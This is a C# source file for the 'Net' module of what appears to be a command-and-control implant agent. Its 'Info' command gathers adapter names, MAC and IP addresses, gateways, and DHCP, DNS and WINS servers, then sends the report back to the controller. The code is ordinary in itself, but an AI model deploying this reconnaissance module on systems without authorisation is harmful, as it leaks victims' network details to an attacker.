using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Shared.Models;

using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;

namespace Agent.Modules
{
    public class NetAgentModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Net",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "Info",
                        Delegate = GetNetInfo
                    }
                }
            };
        }

        private void GetNetInfo(string AgentID, C2Data C2Data)
        {
            try
            {
                var builder = new StringBuilder();

                var adapters = NetworkInterface.GetAllNetworkInterfaces();

                foreach (var adapter in adapters)
                {
                    builder.AppendLine(adapter.Description);
                    builder.AppendLine($"  Name ..................................... : {adapter.Name}");
                    builder.AppendLine($"  Interface type ........................... : {adapter.NetworkInterfaceType}");
                    builder.AppendLine($"  Physical address ......................... : {adapter.GetPhysicalAddress()}");
                    builder.AppendLine($"  Operational status ....................... : {adapter.OperationalStatus}");

                    var ipProps = adapter.GetIPProperties();

                    var versions = string.Empty;

                    if (adapter.Supports(NetworkInterfaceComponent.IPv4))
                    {
                        versions += "IPv4";
                    }

                    if (adapter.Supports(NetworkInterfaceComponent.IPv6))
                    {
                        if (!string.IsNullOrEmpty(versions))
                        {
                            versions += " & ";
                        }

                        versions += "IPv6";
                    }

                    builder.AppendLine($"  IP version(s) ............................ : {versions}");

                    foreach (var ip in ipProps.UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            builder.AppendLine($"  IPv4 ..................................... : {ip.Address}");
                            builder.AppendLine($"  Mask ..................................... : {ip.IPv4Mask}");

                            var v4Props = ipProps.GetIPv4Properties();

                            try
                            {
                                builder.AppendLine($"  DHCP ..................................... : {v4Props.IsDhcpEnabled}");
                            }
                            catch { }
                        }

                        if (ip.Address.AddressFamily == AddressFamily.InterNetworkV6)
                        {
                            builder.AppendLine($"  IPv6 ..................................... : {ip.Address}");
                        }
                    }


                    var gws = ipProps.GatewayAddresses;

                    if (gws.Count > 0)
                    {
                        if (gws.FirstOrDefault().Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            builder.AppendLine($"  Default gateway .......................... : {gws.FirstOrDefault().Address}");
                        }
                    }

                    var dhcpServers = ipProps.DhcpServerAddresses;

                    if (dhcpServers.Count > 0)
                    {
                        foreach (var dhcpServer in dhcpServers)
                        {
                            if (dhcpServer.AddressFamily == AddressFamily.InterNetwork)
                            {
                                builder.AppendLine($"  DHCP server .............................. : {dhcpServer}");
                            }

                            if (dhcpServer.AddressFamily == AddressFamily.InterNetworkV6)
                            {
                                builder.AppendLine($"  DHCP server .............................. : {dhcpServer}");
                            }
                        }
                    }

                    var dnsServers = ipProps.DnsAddresses;

                    if (dnsServers.Count > 0)
                    {
                        foreach (var dnsServer in dnsServers)
                        {
                            if (dnsServer.AddressFamily == AddressFamily.InterNetwork)
                            {
                                builder.AppendLine($"  DNS server ............................... : {dnsServer}");
                            }

                            if (dnsServer.AddressFamily == AddressFamily.InterNetworkV6)
                            {
                                builder.AppendLine($"  DNS server ............................... : {dnsServer}");
                            }
                        }
                    }

                    builder.AppendLine($"  Dynamic DNS .............................. : {ipProps.IsDynamicDnsEnabled}");
                    builder.AppendLine($"  DNS suffix ............................... : {ipProps.DnsSuffix}");
                    builder.AppendLine($"  DNS enabled .............................. : {ipProps.IsDnsEnabled}");

                    if (adapter.Supports(NetworkInterfaceComponent.IPv4))
                    {
                        var ipv4 = ipProps.GetIPv4Properties();

                        if (ipv4.UsesWins)
                        {
                            var winsServers = ipProps.WinsServersAddresses;

                            if (winsServers.Count > 0)
                            {
                                builder.AppendLine($"  Primary WINS server ...................... : {winsServers.FirstOrDefault()}");
                            }
                        }
                    }

                    builder.AppendLine();
                }

                Agent.SendMessage(builder.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }
    }
}